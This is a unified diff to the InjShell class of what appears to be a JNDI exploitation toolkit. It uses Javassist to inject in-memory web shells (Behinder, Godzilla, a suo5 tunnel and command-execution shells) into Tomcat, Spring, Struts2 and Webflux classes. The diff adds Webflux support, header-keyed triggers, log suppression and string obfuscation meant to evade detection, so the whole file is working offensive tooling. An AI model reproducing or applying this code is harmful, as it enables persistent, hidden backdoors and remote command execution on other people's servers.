@@ -18,6 +18,7 @@ import static com.nu1r.jndi.gadgets.utils.Utils.base64Decode;
 import static com.nu1r.jndi.gadgets.utils.Utils.writeClassToFile;
 import static com.nu1r.jndi.template.shell.MemShellPayloads.*;
 import static com.nu1r.jndi.gadgets.Config.Config.*;
+import static com.nu1r.jndi.template.shell.MemShellPayloads.SUO5.CMD_SHELL_FOR_WEBFLUX;
 
 public class InjShell {
     public static void insertKeyMethod(CtClass ctClass, String type) throws Exception {
@@ -27,10 +28,16 @@ public class InjShell {
         name = name.substring(name.lastIndexOf(".") + 1);
 
         // 大多数 SpringBoot 项目使用内置 Tomcat
-        boolean isTomcat = name.startsWith("T") || name.startsWith("Spring");
+        boolean isTomcat  = name.startsWith("T") || name.startsWith("Spring");
+        boolean isWebflux = name.contains("Webflux");
 
         // 判断是 filter 型还是 servlet 型内存马，根据不同类型写入不同逻辑
         String method = "";
+        if (name.contains("SpringControllerMS")) {
+            method = "drop";
+        } else if (name.contains("Struts2ActionMS")) {
+            method = "executeAction";
+        }
 
         List<CtClass> classes = new java.util.ArrayList<CtClass>(Arrays.asList(ctClass.getInterfaces()));
         classes.add(ctClass.getSuperclass());
@@ -43,8 +50,16 @@ public class InjShell {
             }
         }
 
+        // 命令执行、各种内存马
+        insertField(ctClass, "HEADER_KEY", "public static String HEADER_KEY=" + converString(HEADER_KEY) + ";");
+        insertField(ctClass, "HEADER_VALUE", "public static String HEADER_VALUE=" + converString(HEADER_VALUE) + ";");
+
         if ("bx".equals(type)) {
-            ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
+            try {
+                ctClass.getDeclaredMethod("base64Decode");
+            } catch (NotFoundException e) {
+                ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
+            }
 
             try {
                 ctClass.getDeclaredMethod("getFieldValue");
@@ -52,7 +67,21 @@ public class InjShell {
                 ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
             }
 
-            ctClass.addMethod(CtMethod.make(base64Decode(GET_UNSAFE), ctClass));
+            try {
+                ctClass.getDeclaredMethod("getMethodByClass");
+            } catch (NotFoundException e) {
+                ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_BY_CLASS), ctClass));
+            }
+
+            try {
+                ctClass.getDeclaredMethod("getMethodAndInvoke");
+            } catch (NotFoundException e) {
+                ctClass.addMethod(CtMethod.make(base64Decode(GET_METHOD_AND_INVOKE), ctClass));
+            }
+
+            if (IS_OBSCURE) {
+                ctClass.addMethod(CtMethod.make(base64Decode(GET_UNSAFE), ctClass));
+            }
 
             String shell = "";
             if (isTomcat) {
@@ -62,26 +91,66 @@ public class InjShell {
                 shell = IS_OBSCURE ? BEHINDER_SHELL_OBSCURE : BEHINDER_SHELL;
             }
 
-                insertMethod(ctClass, method, base64Decode(shell).replace("f359740bd1cda994", PASSWORD).replace("https://nu1r.cn/", REFERER));
+            insertMethod(ctClass, method, base64Decode(shell).replace("f359740bd1cda994", PASSWORD));
         } else if ("gz".equals(type)) {
             insertField(ctClass, "payload", "Class payload ;");
-            insertField(ctClass, "xc", "String xc = \"" + PASSWORD + "\";");
+            insertField(ctClass, "xc", "String xc = " + converString(GODZILLA_KEY) + ";");
+            insertField(ctClass, "PASS", "String PASS = " + converString(PASSWORD_ORI) + ";");
 
-            ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
+            try {
+                ctClass.getDeclaredMethod("base64Decode");
+            } catch (NotFoundException e) {
+                ctClass.addMethod(CtMethod.make(base64Decode(BASE64_DECODE_STRING_TO_BYTE), ctClass));
+            }
+
             ctClass.addMethod(CtMethod.make(base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
             ctClass.addMethod(CtMethod.make(base64Decode(MD5), ctClass));
             ctClass.addMethod(CtMethod.make(base64Decode(AES_FOR_GODZILLA), ctClass));
             insertTomcatNoLog(ctClass);
-            insertMethod(ctClass, method, base64Decode(GODZILLA_SHELL).replace("https://nu1r.cn/", REFERER));
+            if (isWebflux) {
+                insertMethod(ctClass, method, base64Decode(GODZILLA_SHELL_FOR_WEBFLUX));
+            } else {
+                insertMethod(ctClass, method, base64Decode(GODZILLA_SHELL));
+            }
         } else if ("gzraw".equals(type)) {
             insertField(ctClass, "payload", "Class payload ;");
-            insertField(ctClass, "xc", "String xc = \"" + PASSWORD + "\";");
+            insertField(ctClass, "xc", "String xc = " + converString(GODZILLA_KEY) + ";");
 
             ctClass.addMethod(CtMethod.make(base64Decode(AES_FOR_GODZILLA), ctClass));
             insertTomcatNoLog(ctClass);
-            insertMethod(ctClass, method, base64Decode(GODZILLA_RAW_SHELL).replace("https://nu1r.cn/", REFERER));
+            insertMethod(ctClass, method, base64Decode(GODZILLA_RAW_SHELL));
+        } else if ("suo5".equals(type)) {
+
+            // 先写入一些需要的基础属性
+            insertField(ctClass, "gInStream", "java.io.InputStream gInStream;");
+            insertField(ctClass, "gOutStream", "java.io.OutputStream gOutStream;");
+
+            // 依次写入方法
+            ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_NEW_CREATE), ctClass));
+            ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_NEW_DATA), ctClass));
+            ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_NEW_DEL), ctClass));
+            ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_SET_STREAM), ctClass));
+            ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_NEW_STATUS), ctClass));
+            ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_U32_TO_BYTES), ctClass));
+            ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_BYTES_TO_U32), ctClass));
+            ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_MARSHAL), ctClass));
+            ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_UNMARSHAL), ctClass));
+            ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_READ_SOCKET), ctClass));
+            ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_READ_INPUT_STREAM_WITH_TIMEOUT), ctClass));
+            ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_TRY_FULL_DUPLEX), ctClass));
+            ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_READ_REQ), ctClass));
+            ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_PROCESS_DATA_UNARY), ctClass));
+            ctClass.addMethod(CtMethod.make(base64Decode(SUO5.SUO5_PROCESS_DATA_BIO), ctClass));
+
+            // 为恶意类设置 Runnable 接口以及 RUN 方法
+            CtClass runnableClass = ClassPool.getDefault().get("java.lang.Runnable");
+            ctClass.addInterface(runnableClass);
+            ctClass.addMethod(CtMethod.make(base64Decode(SUO5.RUN), ctClass));
+
+            // 插入关键方法
+            insertMethod(ctClass, method, base64Decode(SUO5.SUO5));
         } else if ("execute".equals(type)) {
-            ctClass.addField(CtField.make("public static String TAG = \"nu1r\";", ctClass));
+            insertField(ctClass, "TAG", "public static String TAG = \"" + CMD_HEADER_STRING + "\";");
             insertCMD(ctClass);
             ctClass.addMethod(CtMethod.make(base64Decode(GET_REQUEST), ctClass));
             ctClass.addMethod(CtMethod.make(base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
@@ -92,23 +161,42 @@ public class InjShell {
             insertCMD(ctClass);
             insertMethod(ctClass, method, base64Decode(WS_SHELL));
         } else if ("upgrade".equals(type)) {
+            insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = " + converString(CMD_HEADER_STRING) + ";");
+
             ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
             insertCMD(ctClass);
             insertMethod(ctClass, method, base64Decode(UPGRADE_SHELL));
         } else {
             insertCMD(ctClass);
+            insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = " + converString(CMD_HEADER_STRING) + ";");
 
-            if (isTomcat) {
+            if (isWebflux) {
+                insertMethod(ctClass, method, base64Decode(CMD_SHELL_FOR_WEBFLUX));
+            } else if (isTomcat) {
                 insertTomcatNoLog(ctClass);
-                insertMethod(ctClass, method, base64Decode(CMD_SHELL_FOR_TOMCAT).replace("https://nu1r.cn/", REFERER));
+                insertMethod(ctClass, method, base64Decode(CMD_SHELL_FOR_TOMCAT));
             } else {
-                insertMethod(ctClass, method, base64Decode(CMD_SHELL).replace("https://nu1r.cn/", REFERER));
+                insertMethod(ctClass, method, base64Decode(CMD_SHELL));
             }
         }
 
         ctClass.setName(generateClassName());
-        insertField(ctClass, "pattern", "public static String pattern = \"" + URL_PATTERN + "\";");
+        insertField(ctClass, "pattern", "public static String pattern = " + converString(URL_PATTERN) + ";");
 
+    }
+
+    // 恶心一下人，实际没用
+    public static String converString(String target) {
+        if (IS_OBSCURE) {
+            StringBuilder result = new StringBuilder("new String(new byte[]{");
+            byte[]        bytes  = target.getBytes();
+            for (int i = 0; i < bytes.length; i++) {
+                result.append(bytes[i]).append(",");
+            }
+            return result.substring(0, result.length() - 1) + "})";
+        }
+
+        return "\"" + target + "\"";
     }
 
     public static void insertMethod(CtClass ctClass, String method, String payload) throws NotFoundException, CannotCompileException {
